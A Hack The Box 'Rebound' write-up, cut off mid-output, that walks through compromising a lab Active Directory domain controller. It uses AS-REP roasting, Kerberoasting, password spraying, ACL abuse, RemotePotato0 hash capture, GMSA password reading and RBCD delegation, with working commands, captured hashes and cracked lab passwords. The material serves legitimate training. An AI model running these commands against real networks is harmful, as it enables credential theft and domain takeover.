---
icon: basketball
---

# HTB-REBOUND

<figure><img src="../../../../.gitbook/assets/image (502).png" alt=""><figcaption></figcaption></figure>

### Attack Flow Explanation

```
┌─────────────────────────────────────────────────────────────────┐
│                      INITIAL ACCESS                              │
│                                                                  │
│  1. RID Cycling (Guest) → User List                             │
│  2. ASREPRoasting → jjones hash (no crack)                      │
│  3. Kerberoast w/o preauth → ldap_monitor hash                  │
│  4. Crack hash → ldap_monitor:1GR8t@$4u                        │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                   LATERAL MOVEMENT #1                            │
│                                                                  │
│  5. Password Spray → oorend:1GR8t@$4u (reuse)                 │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                      ACL ABUSE                                   │
│                                                                  │
│  6. AddSelf → Add oorend to ServiceMgmt group                   │
│  7. GenericAll → FullControl on Service Users OU                │
│  8. ForceChangePassword → Reset winrm_svc password              │
│  9. WinRM Access → Shell as winrm_svc                           │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                   LATERAL MOVEMENT #2                            │
│                                                                  │
│  10. RemotePotato0 → Capture tbrady NTLMv2 hash                 │
│  11. Crack hash → tbrady:543BOMBOMBUNmanda                      │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                  PRIVILEGE ESCALATION                            │
│                                                                  │
│  12. ReadGMSAPassword → Extract delegator$ NTLM hash            │
│  13. RBCD Configuration → ldap_monitor delegates to delegator$  │
│  14. S4U2Proxy Chain → Impersonate DC01$ via ldap_monitor      │
│  15. Constrained Delegation → Impersonate Administrator         │
│  16. DCSync → Dump Administrator NTLM hash                      │
│  17. Pass-the-Hash → Administrator shell                        │
└─────────────────────────────────────────────────────────────────┘
```

***

### Reconnaissance & Enumeration

#### Port Scanning

First, we perform a comprehensive port scan using RustScan to identify all open ports on the target machine.

**Command:**

```bash
rustscan -a 10.10.11.231 \ blah blah blah
```

**Key Open Ports Discovered:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  (SMB)
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**Analysis:**

* Port **88** (Kerberos) indicates this is a Domain Controller
* Port **389/636** (LDAP/LDAPS) confirms Active Directory services
* Port **445** (SMB) allows for share enumeration
* Port **5985** (WinRM) enables remote management if we get credentials
* Domain identified: **rebound.htb**

***

#### SMB Enumeration

**Host Information Discovery**

**Command:**

```bash
netexec smb 10.10.11.231
```

**Output:**

```
SMB   10.10.11.231  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 
      (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False) (Null Auth:True)
```

**Key Findings:**

* Hostname: **DC01**
* Domain: **rebound.htb**
* SMB Signing: **Enabled** (prevents relay attacks)
* Null Authentication: **Allowed** (we can enumerate without credentials)

**Share Enumeration**

**Command:**

```bash
nxc smb 10.10.11.231 -u guest -p '' -M spider_plus
```

**Output:**

```
SMB         10.10.11.231    445    DC01             Share           Permissions     Remark
SMB         10.10.11.231    445    DC01             -----           -----------     ------
SMB         10.10.11.231    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.231    445    DC01             C$                              Default share
SMB         10.10.11.231    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.231    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.231    445    DC01             Shared          READ            
SMB         10.10.11.231    445    DC01             SYSVOL                          Logon server share
```

**Analysis:**

* Standard DC shares present (ADMIN$, C$, NETLOGON, SYSVOL)
* **IPC$** readable with guest access (allows RID cycling)
* **Shared** folder readable (but empty in this case)
* No immediately accessible files

***

#### User Enumeration via RID Cycling

Since we have **IPC$** access with guest account, we can perform RID (Relative Identifier) cycling to enumerate domain users without credentials.

**Initial RID Cycling (up to RID 4000)**

**Command:**

```bash
nxc smb 10.10.11.231 -u guest -p '' --rid-brute
```

**Output:**

```
SMB         10.10.11.231    445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         10.10.11.231    445    DC01             501: rebound\Guest (SidTypeUser)
SMB         10.10.11.231    445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         10.10.11.231    445    DC01             1000: rebound\DC01$ (SidTypeUser)
SMB         10.10.11.231    445    DC01             1951: rebound\ppaul (SidTypeUser)
SMB         10.10.11.231    445    DC01             2952: rebound\llune (SidTypeUser)
SMB         10.10.11.231    445    DC01             3382: rebound\fflock (SidTypeUser)
```

**Extended RID Cycling (up to RID 20000)**

To ensure we don't miss any users, we extend the RID range using Impacket's `lookupsid.py`.

**Command:**

```bash
lookupsid.py -no-pass 'guest@rebound.htb' 20000
```

**Complete User List:**

```
500: rebound\Administrator (SidTypeUser)
501: rebound\Guest (SidTypeUser)
502: rebound\krbtgt (SidTypeUser)
1000: rebound\DC01$ (SidTypeUser)
1951: rebound\ppaul (SidTypeUser)
2952: rebound\llune (SidTypeUser)
3382: rebound\fflock (SidTypeUser)
5277: rebound\jjones (SidTypeUser)
5569: rebound\mmalone (SidTypeUser)
5680: rebound\nnoon (SidTypeUser)
7681: rebound\ldap_monitor (SidTypeUser)
7682: rebound\oorend (SidTypeUser)
7683: rebound\ServiceMgmt (SidTypeGroup)
7684: rebound\winrm_svc (SidTypeUser)
7685: rebound\batch_runner (SidTypeUser)
7686: rebound\tbrady (SidTypeUser)
7687: rebound\delegator$ (SidTypeUser)
```

**Creating Username List**

**Command:**

```bash
lookupsid.py -no-pass 'guest@rebound.htb' 8000 | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 | tee users
```

**Generated users file:**

```
Administrator
Guest
krbtgt
DC01$
ppaul
llune
fflock
jjones
mmalone
nnoon
ldap_monitor
oorend
winrm_svc
batch_runner
tbrady
delegator$
```

***

### Initial Access - ASREPRoasting

#### Understanding ASREPRoasting

**ASREPRoasting** is an attack against Kerberos where we target user accounts that have the "Do not require Kerberos preauthentication" setting enabled (`UF_DONT_REQUIRE_PREAUTH` flag).

**How it works:**

1. Normally, when requesting a TGT (Ticket Granting Ticket), the client must prove identity with pre-authentication
2. If pre-authentication is disabled, the KDC will return a TGT encrypted with the user's password hash
3. This encrypted TGT can be captured and cracked offline

#### Performing ASREPRoast Attack

**Command:**

```bash
GetNPUsers.py -usersfile users rebound.htb/ -dc-ip 10.10.11.231
```

**Output:**

```
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set

$krb5asrep$23$jjones@REBOUND.HTB:af63246207e1ad457b45d685a948637c$243f1af56c3bf624334d96d0ff6d2d048896aaa9ef21470f6134f10bde3cfd529400aa7166a7a7c3e116ab87a952599263182bf4f42486e1588477f1be2f2afe6bb735689dd3e9e0d1e3208f52c0774fa7cf06c704f2cb283a21821504ebbbae710ddfc29ec2b98c7f1cff2ae8daaa63500c8318bf31afc7e460e6026a50e572644cbee5382113eae84462dfc95c0d24ca3c0f2fbdef028312c04327123533867cbd0024e1b35f77b755fd22a5a19b88a6d74c99fcd8cb508a2e7e835e9d818ef0af51a2c25f7f0e958c653aecc4d8baf063ee04ce64dd957f0173bd650d8f22c672e3c0064c0f93767d

[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**Key Finding:** User **jjones** has `UF_DONT_REQUIRE_PREAUTH` set! We successfully captured their AS-REP hash.

#### Attempting to Crack the Hash

**Command:**

```bash
hashcat -m 18200 asrephashes.txt /usr/share/wordlists/rockyou.txt
```

**Result:** The hash does **not crack** with rockyou.txt. This is intentional in HTB - the hash is not meant to be cracked but used for another attack vector.

***

### Privilege Escalation to ldap\_monitor

#### Kerberoasting without Pre-authentication

Since we have a user (**jjones**) who doesn't require pre-authentication, we can exploit a technique discovered by **Charlie Clark** in September 2022. This allows us to perform **Kerberoasting** without any valid credentials.

**How it works:**

1. Request a TGT for jjones without pre-authentication
2. Use that TGT to request TGS (Ticket Granting Service) tickets for service accounts
3. Crack the TGS tickets offline

#### Executing the Attack

**Command:**

```bash
GetUserSPNs.py -no-preauth jjones -usersfile users -dc-host 10.10.11.231 rebound.htb/
```

**Output:**

```
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN

$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$48f3c57d8fd15d3819256b71$8cc7aab67e49fe0b18ccbcada7ae4903...
[KRBTGT HASH - NOT CRACKABLE]

$krb5tgs$18$DC01$$REBOUND.HTB$*DC01$*$46dff2ffda82ae95db4c5729$0475c55af856fb4db3eda24011b68996...
[DC01 HASH - MACHINE ACCOUNT]

$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$eee6ea4417d65424ed9a2d90a639f38f$b3c67eb5c7a37f4821d52d583e66ee9a7fa63f1913876a30c89bd56865b640705b776519b19f888338fa3a697a747c583e0a69290563ce79e51c1f90969e2616c5b2293b0b1ced2e079d938e01fbeee6ced70859566d8482a555324574c1c31e65efb8a536f22ae15935dab36c0eb2b47208e6367855c197008c02cde5aac1d3fcd7fada514dccba2976ab33845689238a58e75760debbbf3eedbe99e8852af4bdd800eaa582e1af990d340d7d8fbb2f6d9a71ceea5ec6a483113e0df66486f62a1aaf0c80669adf29ee0d3630fa1ca68d075003f6e2fab0216b9b9b9228de665def8a525bb5869df3e5574f2a7bb4c76cd71533dbffc173fbd93325d19cf490d02ff770fddfe430e1eed31e3fa760e35d4c5c1eb01c746b2994e2bd16558fde16796c10388a275b17aeeede2e022f5a2cb460d41e1de629cacf51e0be24edabec6eaba4c6457c4cdab7078bed50621bcbada445e1442fd4f194ddbe3b83d8c03c19524e6712362c81e41a04cdae56958b5502d3da75234a003469f97c0cb078ab8db9794663445e243cb81dc155d8ccbe050c6a0d3f5c83750b51d9b101208f37870319c505e49ab94993c153eea1e6d6f7f2b3180ee1b15f478c33feff5fa3b129cdb2d1d4133eb476e7cb869a76adf9b63e4dded4c9ac3937272ef5193c6916267d3670ddc1798ac5e13b04ec81ce51a189dcca9579d3cd2dc4dc52d1fe754033ae97bd67c92ea10d5fd65384670b60a3fed2394f27b3459dd8bfab09f3151f66728b0fd3f48948bf63691c2f487063cd182a28e71329677a8013f5ce5398e76f2379bd2d965208857b7f70dd2610d060fb9762944bc19dbbea2b7cf8f8740241c9c623e06083e6fe271d784e94312096dd80ea961e2a26059780833f7a30ca6525348fa0e5e3d1b812699d40b5ee3c640897bc005afb2996b621aabc26342ac5292bd0ac4e2cd23f95f3e5918f9ece5d7f22d4b6bd68b84a7847aeb18683be3ea59339d8ea3635dcae693533dcb64c88e6cecc3f47848b8fff9593d04316b30ae01caf659306d0ee8314f73d27e00dd36d33b5269ac56d07732281f1791866afa29c647417a536784ad91842c4b7ee9597eab06a8184d38a5760a4c0e97c97cffb240e26bc46cf901c8e5cfa121942b0946ce4a46c4cf170c4321f86cb5b030b4d1761b65cc51046b60ef14cda93d61769eb560ad5f258025cc7a45e5f1114601481d8b4840737dfac57b6d6632bb5a035294147302137d95f874d0e5f0598e44d0d0a2adf5fdddd07443c13b41f83ef24534bdbfa5e7ad9f24b24c7a99b8b76c37000a5a20728041a79408aa3ed8a3d8f29bf9bf94308163873dd8bd80c4457

$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$10be241ce637efe81836851a$bcff7e8ebf480a0e...
[DELEGATOR HASH - MACHINE ACCOUNT]
```

**Analysis:** We obtained several TGS hashes:

* **krbtgt** - Not crackable (high-entropy password)
* **DC01$** - Machine account (not crackable)
* **ldap\_monitor** - Service account ✅ (Potential target!)
* **delegator$** - Machine account (not crackable)

#### Extracting and Cracking ldap\_monitor Hash

**Save the hash:**

```bash
cat kerberoasting_hashes | grep ldap_monitor > ldap_monitor_hash
```

**Crack with hashcat:**

```bash
hashcat -m 13100 ldap_monitor_hash /usr/share/wordlists/rockyou.txt
```

**Output:**

```
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$4a8649250b324086fd0d054a52700773$e88e572c8dc50e730990685a9f3ea6899b635831746026a65868769a205daa70ea8fa0e2390db240eb838b4102b24b6ab574d3108c1f8d78f316ac39ef9fdac7f83617cfe1c3d5436d284e2e688bce286e3d163d553e673e86da86c807926433760d5c720e4e79eb8ac1865467b84caff0bf91a635bad4041c781b0f5a3d81e81c7af85c5e29e8dcf382f5afc70034c701e730e4cf8814782432970a429d764c653e8d9752bebe9e7ec44a00ee57564219db32cd646e75ab900ddb5fcbb6c11ca86cbf7a73ef924a32b7a7f9baae6d054a0b519b0979fe6612a585dd74defbab74653696db1d0c5af68e4fc0383698443e8fb9461030722a27bb9f5383c5de6fb5f35a8ba90baaa6b0f980aa394c16e029f1800bf804c1a10957b3cca4c1f1a12c5459a658703b04269eb383ce22c8d9979c20e994623a6128e7a217859198f12c34c2337e966cdb6fbf76a2f9672689bbf860e402583110247853aeebba280a5aa78ba5fef8abd2bed345a6c1f4645e77813644863c9f771e99018f95ae473f12d3108412531e65054249b1c9fb6a1ceb30abf29cc16455b81bf184daf895d11aaecef7977ec6f0caee04b96195b2df38953b15313d7aca91c72ddfbdae55c7496d0ce8d2f01b89afbba28cf696225c2c117ede0296b465b156666c7b507cf9f15c14ca512cb27922b9c62a1a946c0944e5536f036a70efbb9a04fea42a82cf20c01e8f073329128d442e717e945b2a111cef270448cc8613197b8b56f0a47159917cd38e87dfd2ee70b6dce82a05a9b3738764b458b551146fdaac3f94f0f44874b1b4282fa16969c05e784f5450179fb84fea3fb8c7849163b13c7cd0362316b874d8a87bee88034db21ec2cf2ec9d6a72c36a27d5825a35d84801319d0c56a19a86eab06ae21dd22a75b3cdeff8bc5bfee4a6e57fd85099e7d1ed8ef865498d0abb21cb5bde8ce17dd2ec8d8261299725d85e6d2b246e0c5239105818f22f9610639ad3b6300757e645f36983e3691988699e579373b2a56e2ffbef42aacd0fd29fcb68502f9785afbe1658d3b81fdda3d9a2babc3a00231cc907510a70188fc9d5f6e8661c3d9c9909a692902bd50bdac39a9b82fa49f70cb44944447ca7f345fe2550ee4a4f595f9a4b000103266225e740479c86b4b1bc30c34ba6ed98f031939a546ecd39548f8ed5c0c2f80502eba10449d98122e1a9b605ad31ada89d168bbde39795b1cfff7ef7864e4de4d88ab221e39861b3d8e3ee75a94ea757d5fa0a9fb27269b516109fc623562dbc9c65f85881ec42687c0a4cee34767e66cee844a5633fca6fcdc4704b8c677b6857d6e1e56a736e06717575cbd728209c9be:1GR8t@$$4u
```

**✅ SUCCESS!**

```
ldap_monitor:1GR8t@$$4u
```

#### Validating Credentials

**Test with NetExec:**

```bash
netexec ldap dc01.rebound.htb -u ldap_monitor -p '1GR8t@$$4u'
```

**Error:**

```
[-] LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using '-k'.
```

**Explanation:** The error indicates that LDAP channel binding is enforced, requiring Kerberos authentication instead of NTLM.

#### Time Synchronization (Critical!)

Before using Kerberos authentication, we **must** synchronize our clock with the Domain Controller. Kerberos is extremely sensitive to time skew (default tolerance is 5 minutes).

**Sync time:**

```bash
sudo ntpdate dc01.rebound.htb
```

**Retry with Kerberos (-k flag):**

```bash
netexec ldap dc01.rebound.htb -u ldap_monitor -p '1GR8t@$$4u' -k
```

**Output:**

```
LDAP        10.10.11.231    389    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u
```

**✅ Authentication successful!**

***

### Lateral Movement to oorend

#### BloodHound Enumeration

Now that we have valid credentials, we can perform deep Active Directory enumeration using BloodHound.

**Command:**

```bash
bloodhound-python -k -dc dc01.rebound.htb -ns 10.10.11.231 -c all \
  -d rebound.htb -u ldap_monitor -p '1GR8t@$$4u' --zip
```

**Output:**

```
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 0 trusts
```

**Analysis:** After importing into BloodHound GUI, we find that **ldap\_monitor** has no special privileges or interesting attack paths. We need to find another way forward.

#### Password Reuse Attack

In enterprise environments, password reuse is common. Let's test if other users share the same password as **ldap\_monitor**.

**Command:**

```bash
netexec smb rebound.htb -u usernames.txt -p '1GR8t@$$4u' --continue-on-success
```

**Output:**

```
[+] rebound.htb\ldap_monitor:1GR8t@$$4u
[+] rebound.htb\oorend:1GR8t@$$4u
```

**✅ Excellent! User `oorend` reuses the same password!**

```
oorend:1GR8t@$$4u
```

***

### ACL Abuse to winrm\_svc

#### BloodHound Attack Path Analysis

After updating BloodHound with oorend as our starting node, we discover a privilege escalation path:

```
oorend → ServiceMgmt Group → winrm_svc
```

**Attack Path Breakdown:**

1. **oorend** has `AddSelf` rights on the **ServiceMgmt** group
2. **ServiceMgmt** group has `GenericAll` rights on the **Service Users** OU
3. **winrm\_svc** is located in the **Service Users** OU
4. **winrm\_svc** is a member of **Remote Management Users** (WinRM access)

#### Step 1: AddSelf - Adding oorend to ServiceMgmt Group

The `AddSelf` privilege allows a user to add themselves to a group without admin rights.

**Why use bloodyAD instead of Impacket?**

* bloodyAD uses LDAP modify queries (more reliable)
* Impacket's net.py uses RPC (sometimes blocked or unreliable)

**Command:**

```bash
bloodyAD --host rebound.htb -u oorend -p '1GR8t@$$4u' \
  add groupMember servicemgmt oorend
```

**Output:**

```
[+] oorend added to servicemgmt
```

**Verify membership:**

```bash
bloodyAD --host rebound.htb -u oorend -p '1GR8t@$$4u' \
  get object servicemgmt --attr member
```

**Output:**

```
distinguishedName: CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
member: CN=oorend,CN=Users,DC=rebound,DC=htb; 
        CN=fflock,CN=Users,DC=rebound,DC=htb; 
        CN=ppaul,CN=Users,DC=rebound,DC=htb
```

**✅ oorend is now a member of ServiceMgmt!**

**⚠️ Important Note:** There's a cleanup script running in the background that periodically removes oorend from this group. We need to work quickly once added!

#### Step 2: GenericAll on Service Users OU

Now that oorend is in the **ServiceMgmt** group, we inherit `GenericAll` rights over the **Service Users** OU. This allows us to modify any object within that OU.

**Synchronize time again:**

```bash
sudo ntpdate dc01.rebound.htb
```

**Grant ourselves FullControl over the OU:**

```bash
impacket-dacledit -k -action 'write' -rights 'FullControl' \
  -principal oorend -target-dn 'OU=Service Users,DC=rebound,DC=htb' \
  -inheritance rebound.htb/oorend:'1GR8t@$$4u' -use-ldaps \
  -dc-ip rebound.htb
```

**Output:**

```
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20230911-221137.bak
[*] DACL modified successfully!
```

#### Step 3: ForceChangePassword on winrm\_svc

With `FullControl` over the OU, we can now reset the password of **winrm\_svc** without knowing the current password.

**Command:**

```bash
impacket-changepasswd rebound.htb/winrm_svc@dc01.rebound.htb \
  -newpass newPassword1 -altuser oorend -altpass '1GR8t@$$4u' \
  -k -no-pass -reset
```

**Output:**

```
[*] Setting the password of rebound.htb\winrm_svc as rebound.htb\oorend
[*] Connecting to DCE/RPC as rebound.htb\oorend
[*] Password was changed successfully.
```

**✅ Password changed!**

```
winrm_svc:newPassword1
```

#### Getting WinRM Access

**Command:**

```bash
evil-winrm -i dc01.rebound.htb -u winrm_svc -p newPassword1
```

**Output:**

```
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

**✅ We have a shell as winrm\_svc!**

***

### RemotePotato0 Attack

#### Understanding RemotePotato0

**RemotePotato0** is a sophisticated attack that exploits the DCOM activation service to:

1. Trigger NTLM authentication from privileged users logged onto the machine
2. Relay those credentials to capture NTLMv2 hashes
3. These hashes can then be cracked offline

**Requirements:**

* Access to a machine where privileged users are logged in
* Ability to execute code on the target
* Network access from attacker machine to target

#### Setting Up the Attack

**Step 1: Setup Port Forwarding on Attacker Machine**

We need to relay RPC traffic from the target to our machine.

**Command:**

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999
```

**Explanation:**

* Listens on port **135** (RPC port)
* Forwards traffic to **10.10.11.231:9999** (our listener)
* This creates a relay chain for the NTLM authentication

**Step 2: Upload RemotePotato0.exe to Target**

First, download RemotePotato0 from: https://github.com/antonioCoco/RemotePotato0

**Upload via evil-winrm:**

```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> upload RemotePotato0.exe
```

**Step 3: Execute RemotePotato0**

**Command:**

```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RemotePotato0.exe -m 2 -r 10.10.14.179 -x 10.10.14.179 -p 9999 -s 1
```

**Parameters:**

* `-m 2` : Mode 2 (capture hash)
* `-r 10.10.14.179` : Attacker IP for relay
* `-x 10.10.14.179` : Attacker IP for exploit server
* `-p 9999` : Port to connect back to
* `-s 1` : Target security mode

**Output:**

```
[*] Starting RemotePotato0
[*] Listening on 0.0.0.0:9999
[*] Triggering DCOM activation...
[*] Got connection from 127.0.0.1
[*] Relaying to attacker...

NTLMv2 Client   : DC01
NTLMv2 Username : rebound\tbrady
NTLMv2 Hash     : tbrady::rebound:c128ff12b10bd451:f661bd37ef4bf874ad2eaea5b4657a71:0101000000000000757cfe6939e5d901ad99dd33172d8b570000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800757cfe6939e5d90106000400060000000800300030000000000000000100000000200000de60802558498b1dbb2b2457618802fb750e018666e4d1572bde717a4177359b0a00100000000000000000000000000000000000090000000000000000000000
```

**✅ SUCCESS! We captured NTLMv2 hash for user `tbrady`!**

#### Cracking tbrady's Hash

**Save the hash:**

```bash
echo 'tbrady::rebound:c128ff12b10bd451:f661bd37ef4bf874ad2eaea5b4657a71:0101000000000000757cfe6939e5d901ad99dd33172d8b570000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800757cfe6939e5d90106000400060000000800300030000000000000000100000000200000de60802558498b1dbb2b2457618802fb750e018666e4d1572bde717a4177359b0a00100000000000000000000000000000000000090000000000000000000000' > tbrady.hash
```

**Crack with hashcat:**

```bash
hashcat -m 5600 tbrady.hash /usr/share/wordlists/rockyou.txt
```

**Output:**

```
tbrady::rebound:c128ff12b10bd451:f661bd37ef4bf874ad2eaea5b4657a71:...:543BOMBOMBUNmanda
```

**✅ Cracked!**

```
tbrady:543BOMBOMBUNmanda
```

#### Why This Attack Worked

1. **tbrady** was logged into DC01 (as a privileged user)
2. RemotePotato0 triggered DCOM authentication
3. The NTLM authentication was relayed to our machine
4. We captured the NTLMv2 challenge-response
5. The password was weak enough to crack

***

### GMSA Password Extraction

#### BloodHound Analysis for tbrady

After updating BloodHound with **tbrady** as our owned node, we discover a new attack path:

```
tbrady → delegator$ (GMSA Account) → DC01$
```

**Attack Path:**

1. **tbrady** has `ReadGMSAPassword` rights on **delegator$**
2. **delegator$** has constrained delegation rights to **DC01$**

#### Understanding GMSA (Group Managed Service Accounts)

**GMSA** accounts are special service accounts where:

* Passwords are automatically managed by Active Directory
* Passwords are 240 characters, randomly generated
* Passwords rotate automatically (default: every 30 days)
* Passwords can be retrieved by authorized principals

#### Extracting GMSA Password

Since **tbrady** has `ReadGMSAPassword` permission, we can retrieve the password hash.

**Synchronize time:**

```bash
sudo ntpdate dc01.rebound.htb
```

**Command:**

```bash
netexec ldap dc01.rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k --gmsa
```

**Output:**

```
LDAP        10.10.11.231    389    DC01             [*] Windows 10 / Server 2019 Build 17763 x64
LDAP        10.10.11.231    389    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda
LDAP        10.10.11.231    389    DC01             
Account: delegator$           NTLM: efe28bfe352b1f1245dbe26bef97f510
```

**✅ SUCCESS! We have the NTLM hash for delegator$!**

```
delegator$:efe28bfe352b1f1245dbe26bef97f510
```

**Why this works:**

* GMSA passwords can be retrieved as NTLM hashes by authorized users
* We don't need to crack this - we can use it directly for Pass-the-Hash attacks

***

### Resource-Based Constrained Delegation

#### Understanding the Attack Path

Now we need to understand how **delegator$** can help us compromise the Domain Controller.

**Check delegation configuration:**

```bash
impacket-findDelegation rebound.htb/tbrady:543BOMBOMBUNmanda -k
```

**Output:**

```
AccountName  AccountType                          DelegationType  DelegationRightsTo     SPN Exists
-----------  -----------------------------------  --------------  ---------------------  ----------
delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No
```

**Key Findings:**

* **delegator$** has **Constrained Delegation** to `http/dc01.rebound.htb`
* But there's **no SPN** registered for delegator$

#### The Problem: No SPN for delegator$

For delegation attacks to work, we need an account with an SPN (Service Principal Name). Let's check if we can create a new computer account.

**Check MachineAccountQuota:**

```bash
netexec ldap dc01.rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k -M maq
```

**Output:**

```
LDAP        10.10.11.231    389    DC01             [*] MachineAccountQuota: 0
```

**Problem:** MAQ is 0, so we cannot create new computer accounts.

#### The Solution: Using ldap\_monitor's SPN

Remember **ldap\_monitor**? We Kerberoasted it earlier, which means it has an SPN!

**Check ldap\_monitor's SPN:**

```bash
GetUserSPNs.py rebound.htb/tbrady:543BOMBOMBUNmanda -k -request-user ldap_monitor
```

**Confirmed:**

* **ldap\_monitor** has SPN: `ldapmonitor/dc01.rebound.htb`

#### Resource-Based Constrained Delegation (RBCD) Attack

**RBCD** allows us to configure delegation rights on computer accounts to enable impersonation.

**Attack Flow:**

1. Configure **ldap\_monitor** to delegate to **delegator$** (RBCD)
2. Use **ldap\_monitor** to impersonate **DC01$** via S4U2Proxy
3. Use **delegator$** to impersonate **Administrator** to DC01

**Step 1: Configure RBCD**

**Synchronize time:**

```bash
sudo ntpdate dc01.rebound.htb
```

**Command:**

```bash
impacket-rbcd -k -action 'write' -delegate-from 'ldap_monitor' \
  -delegate-to 'delegator rebound.htb/delegator \
  -hashes :efe28bfe352b1f1245dbe26bef97f510 -use-ldaps
```

**Output:**

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

**Verify the configuration:**

```bash
impacket-findDelegation rebound.htb/tbrady:543BOMBOMBUNmanda -k
```

**Output:**

```
AccountName   AccountType                          DelegationType              DelegationRightsTo     SPN Exists
------------  -----------------------------------  --------------------------  ---------------------  ----------
ldap_monitor  Person                               Resource-Based Constrained  delegator$             Yes
delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb  No
```

**✅ RBCD configured successfully!**

**Step 2: Request TGS for delegator$ as ldap\_monitor**

Now we use **ldap\_monitor** to request a service ticket to **delegator$**, impersonating **DC01$**.

**Command:**

```bash
impacket-getST -k 'rebound.htb/ldap_monitor:1GR8t@$4u' \
  -spn 'browser/dc01.rebound.htb' -impersonate 'dc01'
```

**Output:**

```
[*] Getting TGT for user
[*] Impersonating dc01
[*] Requesting S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

**We now have a TGS for DC01$!**

**What just happened:**

1. **S4U2Self**: ldap\_monitor requested a ticket for DC01$ to itself
2. **S4U2Proxy**: Forwarded that ticket to access delegators SPN

**Step 3: Use delegator$ to Impersonate Administrator**

Now we use **delegator$** with its constrained delegation rights to impersonate **Administrator** accessing DC01.

**Command:**

```bash
KRB5CCNAME=$(realpath dc01@browser_dc01.rebound.htb@REBOUND.HTB.ccache) \
impacket-getST 'rebound.htb/delegator' \
  -hashes :efe28bfe352b1f1245dbe26bef97f510 \
  -spn http/dc01.rebound.htb \
  -impersonate administrator \
  -additional-ticket 'dc01@browser_dc01.rebound.htb@REBOUND.HTB.ccache'
```

**Output:**

```
[*] Getting TGT for user
